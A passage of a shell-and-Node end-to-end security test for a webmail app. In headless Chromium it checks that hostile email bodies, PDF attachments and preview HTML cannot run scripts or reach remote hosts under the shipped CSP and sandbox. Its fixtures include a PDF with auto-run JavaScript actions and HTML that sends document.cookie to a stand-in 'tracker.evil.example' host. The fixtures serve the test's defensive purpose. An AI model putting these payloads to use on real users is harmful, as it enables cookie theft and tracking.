# This stage proves the #100 change is safe. The message iframe now carries
# `allow-scripts`, so ONE trusted, hash-pinned reporter can postMessage its
# content height to the parent (web/src/app/ui/messageDocument.ts). We rebuild the
# EXACT shape the client ships and load it in real headless Chromium:
#
#   * the OUTER page is served over http WITH the app-shell CSP as a real response
#     HEADER, so the srcdoc iframe inherits it and the two policies INTERSECT for
#     real — exactly as in the app. `script-src 'self' 'sha256-<reporter>'`.
#   * the iframe uses the new sandbox (`allow-scripts`, still NO allow-same-origin)
#     and the message CSP whose only `script-src` is the reporter's sha256.
#   * we load the REAL server-sanitized hostile body, and separately a synthetic
#     normal body of known height.
#
# Both must hold in one run: the hostile body executes NOTHING and fetches NOTHING
# remote (the tracker stays silent), while the trusted reporter STILL runs and the
# frame auto-sizes to content. Every policy artifact below is EXTRACTED from the
# repo at run time by scripts/e2e-policy.cjs — see the block above and #308.
cat > "$WORK/render-check.cjs" <<'NODEEOF'
const http = require("http");
const fs = require("fs");
const puppeteer = require("puppeteer");

// --- THE SHIPPED POLICY, READ OUT OF THE REPO (#308) -------------------------
//
// There are no hand-written copies in this file any more. e2e-policy.cjs parses
// web/src/app/ui/messageDocument.ts, cmd/mailroom/main.go and
// internal/api/blob.go, hashes the ACTUAL height reporter against the ACTUAL pin
// (the check the old self-referential one only resembled), and throws on
// anything it cannot read. A throw here lands in the catch at the bottom, prints
// ERR …, and — since #281 — fails the suite instead of skipping it. That
// ordering matters: an extractor that returned "" would give the browser an
// empty CSP, under which every negative assertion below still passes.
const P = require("/tmp/policy-src/e2e-policy.cjs").extract("/tmp/policy-src");
const REPORTER_SHA256 = P.REPORTER_SHA256;
const REPORTER_JS = P.REPORTER_JS;
const APP_CSP = P.APP_CSP;          // cmd/mailroom/main.go appCSP
const MSG_CSP = P.MSG_CSP;          // messageDocument.ts messageCSP(false)
const SANDBOX = P.MESSAGE_SANDBOX;  // messageDocument.ts MESSAGE_SANDBOX
console.log("POLICY app_csp=" + JSON.stringify(APP_CSP));
console.log("POLICY msg_csp=" + JSON.stringify(MSG_CSP));
console.log("POLICY sandbox=" + JSON.stringify(SANDBOX));

// The REAL server-sanitized hostile body, straight out of Email/get.
const raw = fs.readFileSync("/tmp/body.json", "utf8");
const m = raw.match(/"value":"((?:[^"\\]|\\.)*)"/);
if (!m) { console.log("NOBODY"); process.exit(3); }
const HOSTILE = JSON.parse('"' + m[1] + '"');
// A synthetic normal body with a known content height (600px div + 4px*2 body pad).
const NORMAL = '<div style="height:600px">a normal message</div>';

function messageDoc(body) {
  return "<!DOCTYPE html><html><head><meta charset=\"utf-8\">" +
    "<meta http-equiv=\"Content-Security-Policy\" content=\"" + MSG_CSP + "\">" +
    "<style>body{margin:0;padding:4px}</style></head><body>" +
    body + "<script>" + REPORTER_JS + "</script></body></html>";
}
// ⚠ THE LISTENER'S SCRIPT COMES BEFORE THE IFRAME (#463). The reporter posts
// its height as soon as the frame's document runs — at once, on load, and on the
// ResizeObserver's first callback — and a body with nothing to fetch does all
// three almost immediately. With /harness.js AFTER the iframe, the frame could
// post every height before the listener existed, and a message with no listener
// is simply gone: "NOAUTOHEIGHT normal: the reporter never posted a height,
// after waiting 60018ms", recurring since August (#354, #463) at a 20s deadline
// and a 60s one alike. It was a lost message, not a slow one. An external script blocks the parser,
// so placed first, the listener exists before the iframe element does. The web
// client needed the same fix (ThreadPane's listener is a layout effect).
function outerPage(body) {
  const srcdoc = messageDoc(body).replace(/&/g, "&amp;").replace(/"/g, "&quot;");
  return "<!DOCTYPE html><html><body><script src=\"/harness.js\"></script>" +
    "<iframe id=\"f\" sandbox=\"" + SANDBOX +
    "\" referrerpolicy=\"no-referrer\" srcdoc=\"" + srcdoc + "\"></iframe></body></html>";
}
const HARNESS = "window.__h=[];window.addEventListener('message',function(e){" +
  "var f=document.getElementById('f');" +
  "if(f&&e.source===f.contentWindow&&e.data&&e.data.type==='mailroom-height'&&typeof e.data.height==='number'){window.__h.push(e.data.height);}});";

// --- the ATTACHMENT PREVIEW stage (Forgejo #131) ------------------------------
// The preview is served by its OWN route (internal/api/blob.go PreviewHandler) —
// the one door on this server that hands a stranger's bytes to a browser with an
// inline disposition. What makes that safe is the response, not the embedding
// element, so this stage reproduces the RESPONSE HEADER SET writePreviewHeaders
// emits and drives a real browser at it.
//
// EXTRACTED from writePreviewHeaders, not retyped (#308). Content-Type,
// Content-Disposition and Content-Length are the per-response ones the harness
// must supply; every other header that function sets is a fixed security control
// and arrives here verbatim, so adding one to Go adds it here on the same commit.
//
// A NEW computed header is a hole in this reproduction — the harness would be
// serving a response the real route does not — so an unrecognised dynamic name
// fails rather than being ignored.
// ETag is per-response by nature (it names the part's bytes), so the harness
// supplies one exactly as it supplies Content-Type — see #410. Cache-Control is
// NOT here: it comes from a named constant in blob.go and e2e-policy resolves
// it, so the harness serves the real value rather than one of its own.
const HARNESS_SUPPLIED = ["Content-Type", "Content-Disposition", "Content-Length", "ETag"];
for (const name of P.PREVIEW_DYNAMIC_HEADERS) {
  if (!HARNESS_SUPPLIED.includes(name)) {
    console.log("PREVIEWHEADERUNKNOWN writePreviewHeaders now computes " + name +
      ", which this harness does not reproduce");
    process.exit(15);
  }
}
const PREVIEW_HEADERS = (ct) => Object.assign({}, P.PREVIEW_CONSTANT_HEADERS, {
  "Content-Type": ct,
  "Content-Disposition": 'inline; filename="x.pdf"',
  "ETag": '"e2e-preview.1"',
});

// ⚠ A PDF THAT ACTUALLY TRIES (#308 item 2).
//
// The fixture here was a catalog, one page and a ten-byte content stream: no
// /OpenAction, no /JavaScript, no /Annots, nothing that could contact anything.
// So "a previewed PDF fetched nothing remote" passed BY CONSTRUCTION — the #131
// shape, in the suite written to prevent it.
//
// This one carries three document-level actions and a full-page link:
//   /OpenAction        JavaScript, run when the document opens
//   /AA /O             the page's own open action, a second entry point
//   /Names/JavaScript  document-level script, a third
//   /Annots /URI       a link annotation over the whole page
// The JavaScript calls app.alert (so its execution is OBSERVABLE as a dialog),
// then every network primitive PDFium exposes: app.launchURL, this.getURL and
// this.submitForm.
//
// WHAT THIS WAS MEASURED TO DO, against the pinned Chromium 124 (probe run while
// writing it, both with and without the response CSP):
//
//   * the JavaScript RUNS — app.alert fired once per entry point, three dialogs.
//     The fixture is live; this is the positive control asserted below.
//   * this.submitForm THROWS; this.getURL and app.launchURL are silent no-ops.
//     No request, no popup, no navigation, in any configuration.
//   * ⚠ THE RESPONSE CSP MAKES NO DIFFERENCE TO ANY OF IT. Identical results
//     with `default-src 'none'; sandbox` and with no CSP header at all. Chrome's
//     PDF viewer is a chrome-extension:// document embedding the stream, and our
//     header does not reach the plugin's scripting or its network primitives.
//     What keeps a previewed PDF from phoning home is the VIEWER, not us.
//
// So the assertion below is now honest and live, but its credit belongs to
// Chromium. Read it as "the previewed PDF, which really does try, still reached
// nothing" — not as evidence that our CSP is what stopped it.
const HOSTILE_PDF_JS =
  "app.alert(\"pdf-action-ran\");" +
  "try{app.launchURL(\"http://tracker.evil.example:8099/pdf-launchurl\",true);}catch(e){}" +
  "try{this.getURL(\"http://tracker.evil.example:8099/pdf-geturl\");}catch(e){}" +
  "try{this.submitForm({cURL:\"http://tracker.evil.example:8099/pdf-submit\",cSubmitAs:\"HTML\"});}catch(e){}";
const HOSTILE_PDF =
  "%PDF-1.7\n" +
  "1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R/Names<</JavaScript<</Names[(doc) 5 0 R]>>>>>>endobj\n" +
  "2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n" +
  "3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]/Contents 4 0 R" +
  "/Annots[6 0 R]/AA<</O 5 0 R>>>>endobj\n" +
  "4 0 obj<</Length 10>>stream\n0 0 m\nendstream\nendobj\n" +
  "5 0 obj<</Type/Action/S/JavaScript/JS(" + HOSTILE_PDF_JS.replace(/"/g, "\\\"") + ")>>endobj\n" +
  "6 0 obj<</Type/Annot/Subtype/Link/Rect[0 0 200 200]/Border[0 0 0]" +
  "/A<</Type/Action/S/URI/URI(http://tracker.evil.example:8099/pdf-annot)>>>>endobj\n" +
  "trailer<</Root 1 0 R>>";

// The defence-in-depth payload: what the route would be serving if the type gate
// were ever wrong. postMessage, NOT alert() — `alert()` is silently dropped in a
// sandboxed document, so an assertion built on a dialog counter can never fire and
// would pass no matter what ran. postMessage does fire, which is what makes the
// `previewhtml` case below a live assertion rather than a decorative one.
const PREVIEW_HOSTILE =
  "<html><body><h1>not a pdf</h1>" +
  "<script>parent.postMessage('preview-script-ran','*')</script>" +
  "<script>fetch('http://tracker.evil.example:8099/preview-fetch?c='+document.cookie)</script>" +
  "<img src=\"http://tracker.evil.example:8099/preview-img.gif\">" +
  "<img src=x onerror=\"new Image().src='http://tracker.evil.example:8099/preview-onerror'\">" +
  "</body></html>";

// NO `sandbox` ATTRIBUTE on the frame, matching the client (attachmentPreview.tsx).
// A sandboxed frame is an opaque origin to the SERVER too, so the response's
// Cross-Origin-Resource-Policy would refuse it — the opaque origin comes from the
// response's own CSP `sandbox` directive instead. Verified both ways while building
// this: adding the attribute yields net::ERR_BLOCKED_BY_RESPONSE, and dropping the
// directive lets the embedder reach into the document.
const PREVIEW_JS =
  "(function(){window.__framed=false;window.__ran=false;window.__reach=null;" +
  "window.addEventListener('message',function(e){if(e.data==='preview-script-ran')window.__ran=true;});" +
  "var f=document.createElement('iframe');f.id='p';" +
  "f.setAttribute('referrerpolicy','no-referrer');" +
  "f.addEventListener('load',function(){window.__framed=true;" +
  "try{window.__reach=(f.contentDocument!==null);}catch(e){window.__reach=false;}});" +
  "f.src='/preview'+location.search;document.body.appendChild(f);})();";
function previewPage() {
  return "<!DOCTYPE html><html><body><p>preview harness</p>" +
    "<script src=\"/preview.js\"></script></body></html>";
}

const server = http.createServer((req, res) => {
  const u = new URL(req.url, "http://127.0.0.1");
  const kase = u.searchParams.get("case");
  // The preview route's own response, header for header.
  if (u.pathname === "/preview") {
    const hostile = kase === "previewhtml";
    res.writeHead(200, PREVIEW_HEADERS(hostile ? "text/html" : "application/pdf"));
    res.end(hostile ? PREVIEW_HOSTILE : HOSTILE_PDF); return;
  }
  if (u.pathname === "/preview.js") {
    res.writeHead(200, { "Content-Type": "application/javascript", "Content-Security-Policy": APP_CSP });
    res.end(PREVIEW_JS); return;
  }
  if (u.pathname === "/harness.js") {
    // ⚠ DELIBERATELY SLOW (#463), so the ordering above is PINNED rather than
    // merely correct. With the listener after the iframe, this delay loses the
    // race on every run (measured: "NOREPORTER hostile height=0 after waiting
    // 60017ms"); before the iframe, the parser waits for it and nothing can be
    // lost. Without the delay a regression would pass until a busy runner lost
    // the race by accident, which is the flake this replaces.
    setTimeout(() => {
      res.writeHead(200, { "Content-Type": "application/javascript", "Content-Security-Policy": APP_CSP });
      res.end(HARNESS);
    }, HARNESS_DELAY_MS);
    return;
  }
  res.writeHead(200, { "Content-Type": "text/html", "Content-Security-Policy": APP_CSP });
  if (kase === "preview" || kase === "previewhtml") { res.end(previewPage()); return; }
  res.end(outerPage(kase === "normal" ? NORMAL : HOSTILE));
});

// SETTLE_MS is the fixed pause for cases with no height to wait for, and the
// FLOOR for those that do — long enough for a hostile page to have misbehaved
// if it were going to. The negative assertions (nothing fetched, nothing ran)
// need a window in which the bad thing could happen; shortening this would
// weaken them.
const SETTLE_MS = 1200;
// HEIGHT_DEADLINE_MS bounds the wait for the trusted reporter's postMessage.
//
// This used to be SETTLE_MS and nothing else, which made the assertion depend
// on the machine being fast enough: CI failed once with "NOREPORTER hostile
// height=0" on a run that took 9m8s against a usual 4-5m, while the identical
// commit passed locally with height=82. The assertion is UNCHANGED — a height
// must arrive and must be > 0 — only the deadline is now adaptive. A reporter
// that is genuinely broken still fails, it just takes this long to say so.
//
// RAISED AGAIN, 20s -> 60s (#354). 20s was not enough either: the assertion
// failed three times on 2026-08-31 alone, twice on trees whose only delta from a
// passing run was MARKDOWN. Each time every security assertion in this suite
// passed, INNER_FAILS=0, the tracker received zero bytes, and the single failure
// was this wait expiring.
//
// ⚠ AND 60s WAS NOT ENOUGH EITHER — 2026-09-04, run 1059 (#396). Same shape a
// fourth time: every sanitizer assertion ok, INNER_FAILS=0, the tracker received
// zero bytes, and `height=0 after waiting 60005ms`. The new data point is what
// was happening ALONGSIDE it: the `tabs-e2e` job in the same run died on a
// Docker Hub `502 Bad Gateway` resolving `docker/dockerfile:1`. Two independent
// jobs failing on wall-clock and on an upstream registry in the same run is the
// "harness under load" reading with corroboration rather than a shrug — which
// matters, because the alternative reading of a red security suite is one nobody
// should reach for without evidence.
//
// The deadline is NOT raised again on that evidence. Four occurrences of a
// timing assertion timing out is #354's actual question — whether a wall-clock
// browser measurement belongs in a required check at all — arriving for the
// fourth time, and answering it with a bigger number each time is how a check
// stops meaning anything.
//
// ⚠ THE ASYMMETRY IS THE WHOLE ARGUMENT FOR A LARGE VALUE. A deadline that is
// too long costs time ONLY when the feature is genuinely broken — the suite
// still fails, just later. A deadline that is too short costs a false red on a
// REQUIRED check, on a shared runner, with no rerun API on this Forgejo (all
// three endpoint shapes 404), so the only way to retry is to invent a commit.
// One of those is an inconvenience and the other trains people to disbelieve a
// red security suite, which is how a real failure gets waved through.
//
// This is not a fix for the underlying slowness, and it should not be mistaken
// for one: the reporter still has to post a height, and #354 keeps the question
// of whether a wall-clock browser measurement belongs in a required check at all.
//
// ⚠ THE "UNDER LOAD" READING ABOVE WAS WRONG (#463, 2026-09-23). The reporter
// was not slow; its messages were LOST, posted before the listener existed (see
// outerPage). Reproduced on demand by delaying the listener's script 3s. The
// deadline stays generous for the reason in the asymmetry paragraph, but no
// deadline could ever have fixed a message that was never received.
const HEIGHT_DEADLINE_MS = 60000;
// How late /harness.js is served (see the /harness.js route). Long enough that a
// listener placed after the iframe loses every time; short enough to cost the
// suite nothing measurable.
const HARNESS_DELAY_MS = 1500;

async function runCase(browser, base, kase, opts = {}) {
  const page = await browser.newPage();
  const remoteHits = []; let dialogs = 0;
  // Popups and cross-origin navigations are recorded separately from requests
  // because they are how a PDF action would leave: app.launchURL opens a tab and
  // a /URI link annotation navigates, and neither is guaranteed to surface as an
  // intercepted request on THIS page. Asserting only on remoteHits would leave
  // that door unwatched (#308 item 2).
  const popups = []; const navigations = [];
  page.on("dialog", async d => { dialogs++; await d.dismiss(); });
  // Record the URL, then CLOSE it (#354). A popup is an independent target: page.close()
  // below does not take it with them, so before this every popup the hostile case opened
  // stayed alive as a renderer for the rest of the run. The assertion reads the recorded
  // URL, captured here, so closing changes nothing it can observe.
  page.on("popup", p => {
    try { popups.push(p.url()); } catch (e) { popups.push("?"); }
    p.close().catch(() => {});
  });
  page.on("framenavigated", f => { if (/evil\.example/.test(f.url())) navigations.push(f.url()); });
  await page.setRequestInterception(true);
  page.on("request", r => { if (/tracker\.evil\.example|evil\.example/.test(r.url())) remoteHits.push(r.url()); r.continue(); });
  await page.goto(base + "/?case=" + kase, { waitUntil: "networkidle0", timeout: 15000 });
  await new Promise(r => setTimeout(r, SETTLE_MS));

  let heights = await page.evaluate(() => window.__h || []);
  let waitedMs = 0;
  if (opts.expectHeight) {
    const started = Date.now();
    while (!(heights.length && heights[heights.length - 1] > 0)) {
      if (Date.now() - started >= HEIGHT_DEADLINE_MS) break;
      await new Promise(r => setTimeout(r, 100));
      heights = await page.evaluate(() => window.__h || []);
    }
    waitedMs = Date.now() - started;
  }
  const framed = await page.evaluate(() => window.__framed);
  const ran = await page.evaluate(() => window.__ran);
  const reach = await page.evaluate(() => window.__reach);
  // Did the browser's own PDF viewer actually take the document? Its child frame is
  // a chrome-extension:// URL. This is what makes "the PDF rendered" a positive
  // fact rather than the absence of an error — the exact distinction that made the
  // first version of this stage worthless.
  const pdfViewer = page.frames().slice(1).some(f => f.url().startsWith("chrome-extension://"));
  const endedAt = page.url();
  await page.close();
  return { remoteHits, popups, navigations, dialogs, height: heights[heights.length - 1] || 0,
    framed, ran, reach, pdfViewer, endedAt, waitedMs };
}

(async () => {
  await new Promise(r => server.listen(0, "127.0.0.1", r));
  const base = "http://127.0.0.1:" + server.address().port;
  const browser = await puppeteer.launch({ args: ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"] });
  const h = await runCase(browser, base, "hostile", { expectHeight: true });
  const n = await runCase(browser, base, "normal", { expectHeight: true });
  const p = await runCase(browser, base, "preview");
  const ph = await runCase(browser, base, "previewhtml");
  await browser.close(); server.close();
  if (h.remoteHits.length) { console.log("REMOTEHIT " + h.remoteHits.join(" ")); process.exit(4); }
  if (h.dialogs) { console.log("SCRIPTRAN " + h.dialogs); process.exit(5); }
  if (!(h.height > 0)) {
    console.log("NOREPORTER hostile height=" + h.height + " after waiting " + h.waitedMs +
      "ms — the trusted reporter never posted a height");
    process.exit(7);
  }
  if (!(n.height >= 600 && n.height <= 660)) {
    // Distinguish the two outcomes (#354). They are different defects: a
    // reporter that never posted is the harness under load, a height that
    // posted but is out of range is the feature broken. Until now both
    // printed the same line and the log could not tell you which.
    console.log(n.height === 0
      ? "NOAUTOHEIGHT normal: the reporter never posted a height, after waiting " + n.waitedMs + "ms"
      : "NOAUTOHEIGHT normal height=" + n.height + " after " + n.waitedMs + "ms, want 600..660");
    process.exit(8);
  }

  // ATTACHMENT PREVIEW (#131), case 1 — IT ACTUALLY WORKS. A real PDF served with
  // the preview route's header set must reach the browser's PDF viewer. Asserted
  // positively, because the failure this catches is the one that hurts: the whole
  // first design of this feature (framing a blob: URL from a sandboxed iframe)
  // silently rendered an error page, and every "nothing bad happened" assertion
  // passed while the feature did nothing at all.
  if (!p.pdfViewer) { console.log("PREVIEWNOTRENDERED pdf did not reach the viewer"); process.exit(9); }

  // ⚠ THE POSITIVE CONTROL FOR THE ASSERTION THAT FOLLOWS (#308 item 2).
  //
  // The fixture's /OpenAction, /AA and /Names JavaScript each call app.alert, so
  // a dialog is proof that PDFium EXECUTED the document's actions. Without this
  // line, "the previewed PDF fetched nothing" is satisfied by a PDF that never
  // tried — which is exactly what the old ten-byte fixture was, and why this
  // assertion was decorative for the whole life of the feature.
  //
  // If this ever goes red after a deliberate CHROME_IMAGE bump, the finding is
  // NOT "loosen it": it means the new browser no longer runs PDF JavaScript, the
  // fixture has gone inert, and the no-fetch assertion below has quietly become
  // vacuous again. Find a vector that is live in that browser, or record the
  // assertion as bounded. Do not delete the control.
  if (!(p.dialogs > 0)) {
    console.log("PDFACTIONSINERT the hostile PDF's /OpenAction JavaScript never ran " +
      "(dialogs=" + p.dialogs + "), so 'it fetched nothing' proves nothing");
    process.exit(16);
  }
  if (p.remoteHits.length) { console.log("PREVIEWHIT " + p.remoteHits.join(" ")); process.exit(10); }
  if (p.popups.length) { console.log("PREVIEWPOPUP " + p.popups.join(" ")); process.exit(17); }
  if (p.navigations.length) { console.log("PREVIEWNAV " + p.navigations.join(" ")); process.exit(18); }

  // Case 2 — defence in depth: the same route serving HOSTILE HTML, which is what
  // it would be doing if the type gate were ever wrong. The response's CSP
  // `sandbox` is the only thing standing between those bytes and our origin, and
  // this is the live assertion for it: drop that directive and `reach` flips to
  // true; the script signal is postMessage precisely so it can fire at all.
  if (!ph.framed) { console.log("PREVIEWHTMLNOTFRAMED"); process.exit(11); }
  if (ph.ran) { console.log("PREVIEWHTMLSCRIPTRAN served html executed script"); process.exit(12); }
  if (ph.remoteHits.length) { console.log("PREVIEWHTMLHIT " + ph.remoteHits.join(" ")); process.exit(13); }
  if (ph.reach !== false) {
    console.log("PREVIEWHTMLNOTOPAQUE embedder reached the document, reach=" + String(ph.reach));
    process.exit(14);
  }
  console.log("CLEAN hostile_reporter_height=" + h.height + " normal_autoheight=" + n.height +
    " reporter_wait_ms=" + h.waitedMs + "/" + n.waitedMs +
    // popups_opened tests the #354 accumulation theory on every green run: they are
    // closed now, so a non-zero count here is evidence they were piling up before.
    " popups_opened=" + (h.popups.length + n.popups.length + p.popups.length + ph.popups.length) +
    " pdf_rendered=true pdf_actions_ran=" + p.dialogs +
    " pdf_reached_nothing=true html_opaque_and_inert=true");
})().catch(e => { console.log("ERR " + e.message); process.exit(2); });
NODEEOF

node_check() {
  # docker cp the script IN rather than bind-mounting a host path (see cert note).
  # --shm-size: Chromium keeps renderer shared memory in /dev/shm, which Docker
  # defaults to 64 MiB. Four cases run in ONE browser and the hostile case
  # deliberately opens popups, so several renderers are alive at once. When shm
  # runs out a renderer stalls rather than erroring, which surfaces here as a
  # frame that never posts its height — not as a crash (#354).
  cid=$(docker create --network "$NET" --shm-size=1g \
    -e NODE_PATH=/usr/src/app/node_modules --entrypoint node "$CHROME_IMAGE" /tmp/render-check.cjs)
  docker cp "$WORK_HOST/render-check.cjs" "$cid:/tmp/render-check.cjs" >/dev/null
  docker cp "$WORK_HOST/body.json" "$cid:/tmp/body.json" >/dev/null
  # The extractor plus the three authoritative policy sources (#308).
  docker cp "$WORK_HOST/policy-src" "$cid:/tmp/policy-src" >/dev/null
  docker start -a "$cid" 2>&1
  docker rm -fv "$cid" >/dev/null 2>&1
}
# ⚠ THE BROWSER STAGE FAILS CLOSED (#281).
#
# This used to end in a catch-all `else` printing "skip … unavailable" for ANY
# output that was neither CLEAN nor one of a dozen enumerated failure tokens.
# It was written for "the image could not be pulled", but it also caught the
# render script's own catch handler — `console.log("ERR " + e.message)` — so a
# renamed route, a changed response header, a moved puppeteer API or a timeout
# all reported as a SKIP, left FAILFILE untouched, and let this script print
# "HOSTILE CONTENT IS NEUTRALIZED END TO END" and exit 0.
#
# That is the #131 shape inside the suite meant to prevent it. Everything being
# skipped is a NEGATIVE assertion — nothing executed, nothing was fetched, the
# sandbox held — and "I could not check" read identically to "checked, clean".
# The enumerated tokens were an ALLOWLIST OF ALREADY-KNOWN FAILURES, so a new
# failure mode could not redden the build by construction.
#
# Now only a genuinely unobtainable image may skip, it must be opted into
# explicitly, and everything else fails. Same rule as pgp-interop (#263): a
# missing dependency is a FAILURE, so a green job is itself proof the check ran.
if ! docker image inspect "$CHROME_IMAGE" >/dev/null 2>&1 \
   && ! docker pull -q "$CHROME_IMAGE" >/dev/null 2>&1; then
  if [ "${MAILROOM_SKIP_BROWSER:-0}" = "1" ]; then
    echo "skip  browser stage: $CHROME_IMAGE unobtainable, MAILROOM_SKIP_BROWSER=1"
  else
    echo "FAIL  browser stage: $CHROME_IMAGE could not be obtained, so the"
    echo "      no-fetch / no-script / sandbox assertions never ran."
    echo "      Set MAILROOM_SKIP_BROWSER=1 to skip this deliberately."
    echo "1" >> "$FAILFILE"
  fi
else
  BROWSER_OUT=$(node_check 2>&1 || true)
  if echo "$BROWSER_OUT" | grep -q CLEAN; then
    echo "ok    headless Chromium: no remote fetch, no script executed ($BROWSER_OUT)"
    echo "ok    the trusted reporter ran under the CSP intersection; the frame auto-sized to content"
    echo "ok    attachment preview (#131): a real PDF reached the browser viewer, and the"
    echo "      same route serving hostile HTML executed nothing, fetched nothing and was"
    echo "      opaque to the embedder (the response CSP sandbox)"
    echo "ok    the previewed PDF is HOSTILE and its actions RAN (pdf_actions_ran above is"
    echo "      the count of /OpenAction, /AA and /Names scripts that executed, #308) — it"
    echo "      called launchURL, getURL and submitForm and still reached nothing. NOTE: it"
    echo "      was measured that our response CSP does not govern PDFium at all; the"
    echo "      browser's PDF viewer is what refuses those calls, not this header set."
  else
    # NO allowlist. Anything that is not CLEAN is a failure — the known tokens,
    # "ERR …" from the render script, and any output nobody has seen before.
    echo "FAIL  browser render: $BROWSER_OUT"; echo "1" >> "$FAILFILE"
  fi
fi

# --- verdict -----------------------------------------------------------------
FAILS=$(wc -l < "$FAILFILE" 2>/dev/null | tr -d ' \r\n')
FAILS=${FAILS:-0}
echo
if [ "$FAILS" != "0" ]; then
  echo "=== mailroom logs ==="
  docker logs "$APP" 2>&1 | tail -30
  echo
  echo "HOSTILE-CONTENT E2E FAILED ($FAILS assertion(s))"
  exit 1
fi
echo "=== HOSTILE CONTENT IS NEUTRALIZED END TO END ==="
